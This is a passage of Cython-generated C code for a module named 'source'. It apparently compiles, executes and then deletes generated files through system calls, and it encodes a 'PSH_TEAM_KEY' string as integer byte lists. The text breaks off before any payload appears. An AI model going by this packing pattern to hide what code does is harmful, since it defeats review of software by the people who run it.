    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_s_COMPILE_FILE, __pyx_k_COMPILE_FILE, sizeof(__pyx_k_COMPILE_FILE), 0, 0, 1, 1},
  {&__pyx_n_s_C_FILE, __pyx_k_C_FILE, sizeof(__pyx_k_C_FILE), 0, 0, 1, 1},
  {&__pyx_n_s_C_SOURCE, __pyx_k_C_SOURCE, sizeof(__pyx_k_C_SOURCE), 0, 0, 1, 1},
  {&__pyx_n_s_EXECUTE_FILE, __pyx_k_EXECUTE_FILE, sizeof(__pyx_k_EXECUTE_FILE), 0, 0, 1, 1},
  {&__pyx_n_s_EXPORT_PYTHONHOME, __pyx_k_EXPORT_PYTHONHOME, sizeof(__pyx_k_EXPORT_PYTHONHOME), 0, 0, 1, 1},
  {&__pyx_n_s_EXPORT_PYTHON_EXECUTABLE, __pyx_k_EXPORT_PYTHON_EXECUTABLE, sizeof(__pyx_k_EXPORT_PYTHON_EXECUTABLE), 0, 0, 1, 1},
  {&__pyx_n_s_PREFIX, __pyx_k_PREFIX, sizeof(__pyx_k_PREFIX), 0, 0, 1, 1},
  {&__pyx_n_s_PSH_TEAM_KEY, __pyx_k_PSH_TEAM_KEY, sizeof(__pyx_k_PSH_TEAM_KEY), 0, 0, 1, 1},
  {&__pyx_n_s_PYTHON_VERSION, __pyx_k_PYTHON_VERSION, sizeof(__pyx_k_PYTHON_VERSION), 0, 0, 1, 1},
  {&__pyx_n_s_RUN, __pyx_k_RUN, sizeof(__pyx_k_RUN), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_dirname, __pyx_k_dirname, sizeof(__pyx_k_dirname), 0, 0, 1, 1},
  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
  {&__pyx_n_s_executable, __pyx_k_executable, sizeof(__pyx_k_executable), 0, 0, 1, 1},
  {&__pyx_n_s_exist_ok, __pyx_k_exist_ok, sizeof(__pyx_k_exist_ok), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
  {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},
  {&__pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define, __pyx_k_ifndef_PY_SSIZE_T_CLEAN_define, sizeof(__pyx_k_ifndef_PY_SSIZE_T_CLEAN_define), 0, 1, 0, 0},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_isfile, __pyx_k_isfile, sizeof(__pyx_k_isfile), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_makedirs, __pyx_k_makedirs, sizeof(__pyx_k_makedirs), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},
  {&__pyx_n_s_prefix, __pyx_k_prefix, sizeof(__pyx_k_prefix), 0, 0, 1, 1},
  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_version, __pyx_k_version, sizeof(__pyx_k_version), 0, 0, 1, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 92, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 3747, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(1, __pyx_int_0); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 92, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);

  
  __pyx_slice__2 = PySlice_New(Py_None, __pyx_int_neg_1, Py_None); if (unlikely(!__pyx_slice__2)) __PYX_ERR(0, 3728, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__2);
  __Pyx_GIVEREF(__pyx_slice__2);

  
  __pyx_tuple__3 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 3747, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_32 = PyInt_FromLong(32); if (unlikely(!__pyx_int_32)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_38 = PyInt_FromLong(38); if (unlikely(!__pyx_int_38)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_45 = PyInt_FromLong(45); if (unlikely(!__pyx_int_45)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_46 = PyInt_FromLong(46); if (unlikely(!__pyx_int_46)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_47 = PyInt_FromLong(47); if (unlikely(!__pyx_int_47)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_48 = PyInt_FromLong(48); if (unlikely(!__pyx_int_48)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_49 = PyInt_FromLong(49); if (unlikely(!__pyx_int_49)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_50 = PyInt_FromLong(50); if (unlikely(!__pyx_int_50)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_51 = PyInt_FromLong(51); if (unlikely(!__pyx_int_51)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_52 = PyInt_FromLong(52); if (unlikely(!__pyx_int_52)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_53 = PyInt_FromLong(53); if (unlikely(!__pyx_int_53)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_54 = PyInt_FromLong(54); if (unlikely(!__pyx_int_54)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_55 = PyInt_FromLong(55); if (unlikely(!__pyx_int_55)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_61 = PyInt_FromLong(61); if (unlikely(!__pyx_int_61)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_65 = PyInt_FromLong(65); if (unlikely(!__pyx_int_65)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_66 = PyInt_FromLong(66); if (unlikely(!__pyx_int_66)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_67 = PyInt_FromLong(67); if (unlikely(!__pyx_int_67)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_69 = PyInt_FromLong(69); if (unlikely(!__pyx_int_69)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_72 = PyInt_FromLong(72); if (unlikely(!__pyx_int_72)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_73 = PyInt_FromLong(73); if (unlikely(!__pyx_int_73)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_76 = PyInt_FromLong(76); if (unlikely(!__pyx_int_76)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_77 = PyInt_FromLong(77); if (unlikely(!__pyx_int_77)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_78 = PyInt_FromLong(78); if (unlikely(!__pyx_int_78)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_79 = PyInt_FromLong(79); if (unlikely(!__pyx_int_79)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_80 = PyInt_FromLong(80); if (unlikely(!__pyx_int_80)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_82 = PyInt_FromLong(82); if (unlikely(!__pyx_int_82)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_84 = PyInt_FromLong(84); if (unlikely(!__pyx_int_84)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_85 = PyInt_FromLong(85); if (unlikely(!__pyx_int_85)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_86 = PyInt_FromLong(86); if (unlikely(!__pyx_int_86)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_88 = PyInt_FromLong(88); if (unlikely(!__pyx_int_88)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_89 = PyInt_FromLong(89); if (unlikely(!__pyx_int_89)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_95 = PyInt_FromLong(95); if (unlikely(!__pyx_int_95)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_97 = PyInt_FromLong(97); if (unlikely(!__pyx_int_97)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_98 = PyInt_FromLong(98); if (unlikely(!__pyx_int_98)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_99 = PyInt_FromLong(99); if (unlikely(!__pyx_int_99)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_100 = PyInt_FromLong(100); if (unlikely(!__pyx_int_100)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_101 = PyInt_FromLong(101); if (unlikely(!__pyx_int_101)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_103 = PyInt_FromLong(103); if (unlikely(!__pyx_int_103)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_104 = PyInt_FromLong(104); if (unlikely(!__pyx_int_104)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_105 = PyInt_FromLong(105); if (unlikely(!__pyx_int_105)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_108 = PyInt_FromLong(108); if (unlikely(!__pyx_int_108)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_110 = PyInt_FromLong(110); if (unlikely(!__pyx_int_110)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_111 = PyInt_FromLong(111); if (unlikely(!__pyx_int_111)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_112 = PyInt_FromLong(112); if (unlikely(!__pyx_int_112)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_114 = PyInt_FromLong(114); if (unlikely(!__pyx_int_114)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_116 = PyInt_FromLong(116); if (unlikely(!__pyx_int_116)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_117 = PyInt_FromLong(117); if (unlikely(!__pyx_int_117)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_118 = PyInt_FromLong(118); if (unlikely(!__pyx_int_118)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_119 = PyInt_FromLong(119); if (unlikely(!__pyx_int_119)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_120 = PyInt_FromLong(120); if (unlikely(!__pyx_int_120)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_121 = PyInt_FromLong(121); if (unlikely(!__pyx_int_121)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_128 = PyInt_FromLong(128); if (unlikely(!__pyx_int_128)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_145 = PyInt_FromLong(145); if (unlikely(!__pyx_int_145)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_159 = PyInt_FromLong(159); if (unlikely(!__pyx_int_159)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_168 = PyInt_FromLong(168); if (unlikely(!__pyx_int_168)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_174 = PyInt_FromLong(174); if (unlikely(!__pyx_int_174)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_216 = PyInt_FromLong(216); if (unlikely(!__pyx_int_216)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_240 = PyInt_FromLong(240); if (unlikely(!__pyx_int_240)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_neg_1 = PyInt_FromLong(-1); if (unlikely(!__pyx_int_neg_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 5, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #if PY_MAJOR_VERSION < 3 && (__PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT)
  if (__Pyx_init_sys_getdefaultencoding_params() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  if (__pyx_module_is_main_source) {
    if (PyObject_SetAttr(__pyx_m, __pyx_n_s_name, __pyx_n_s_main) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  }
  #if PY_MAJOR_VERSION >= 3
  {
    PyObject *modules = PyImport_GetModuleDict(); if (unlikely(!modules)) __PYX_ERR(0, 5, __pyx_L1_error)
    if (!PyDict_GetItemString(modules, "source")) {
      if (unlikely(PyDict_SetItemString(modules, "source", __pyx_m) < 0)) __PYX_ERR(0, 5, __pyx_L1_error)
    }
  }
  #endif
  /*--- Builtin init code ---*/
  if (__Pyx_InitCachedBuiltins() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Constants init code ---*/
  if (__Pyx_InitCachedConstants() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Global type/function init code ---*/
  (void)__Pyx_modinit_global_init_code();
  (void)__Pyx_modinit_variable_export_code();
  (void)__Pyx_modinit_function_export_code();
  (void)__Pyx_modinit_type_init_code();
  (void)__Pyx_modinit_type_import_code();
  (void)__Pyx_modinit_variable_import_code();
  (void)__Pyx_modinit_function_import_code();
  /*--- Execution code ---*/
  #if defined(__Pyx_Generator_USED) || defined(__Pyx_Coroutine_USED)
  if (__Pyx_patch_abc() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_os, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_os, __pyx_t_1) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_Import(__pyx_n_s_sys, 0, 0); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_sys, __pyx_t_1) < 0) __PYX_ERR(0, 6, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(9); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_INCREF(__pyx_int_216);
  __Pyx_GIVEREF(__pyx_int_216);
  PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_216);
  __Pyx_INCREF(__pyx_int_168);
  __Pyx_GIVEREF(__pyx_int_168);
  PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_168);
  __Pyx_INCREF(__pyx_int_216);
  __Pyx_GIVEREF(__pyx_int_216);
  PyList_SET_ITEM(__pyx_t_1, 2, __pyx_int_216);
  __Pyx_INCREF(__pyx_int_174);
  __Pyx_GIVEREF(__pyx_int_174);
  PyList_SET_ITEM(__pyx_t_1, 3, __pyx_int_174);
  __Pyx_INCREF(__pyx_int_32);
  __Pyx_GIVEREF(__pyx_int_32);
  PyList_SET_ITEM(__pyx_t_1, 4, __pyx_int_32);
  __Pyx_INCREF(__pyx_int_240);
  __Pyx_GIVEREF(__pyx_int_240);
  PyList_SET_ITEM(__pyx_t_1, 5, __pyx_int_240);
  __Pyx_INCREF(__pyx_int_159);
  __Pyx_GIVEREF(__pyx_int_159);
  PyList_SET_ITEM(__pyx_t_1, 6, __pyx_int_159);
  __Pyx_INCREF(__pyx_int_145);
  __Pyx_GIVEREF(__pyx_int_145);
  PyList_SET_ITEM(__pyx_t_1, 7, __pyx_int_145);
  __Pyx_INCREF(__pyx_int_128);
  __Pyx_GIVEREF(__pyx_int_128);
  PyList_SET_ITEM(__pyx_t_1, 8, __pyx_int_128);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_PSH_TEAM_KEY, __pyx_t_1) < 0) __PYX_ERR(0, 8, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = PyList_New(29); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 10, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
